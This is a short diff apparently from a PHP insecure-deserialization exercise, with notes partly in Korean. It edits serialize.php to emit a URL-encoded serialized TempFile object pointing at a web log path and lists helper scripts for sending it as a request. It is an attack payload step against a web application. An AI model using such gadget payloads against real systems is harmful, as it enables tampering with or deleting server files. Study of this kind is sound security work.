@@ -1,0 +1,11 @@
+1. serialize.php 변경
+<?php
+include 'TempFile.php';
+
+// echo urlencode(serialize(new UserData('Alice', 'alice@example.com')));
+echo urlencode(serialize(new TempFile('/var/www/html/logs/...'))) . "\n";
+
+?>
+
+2. get_serialize.sh
+3. request.sh SERIALIZE_DATA
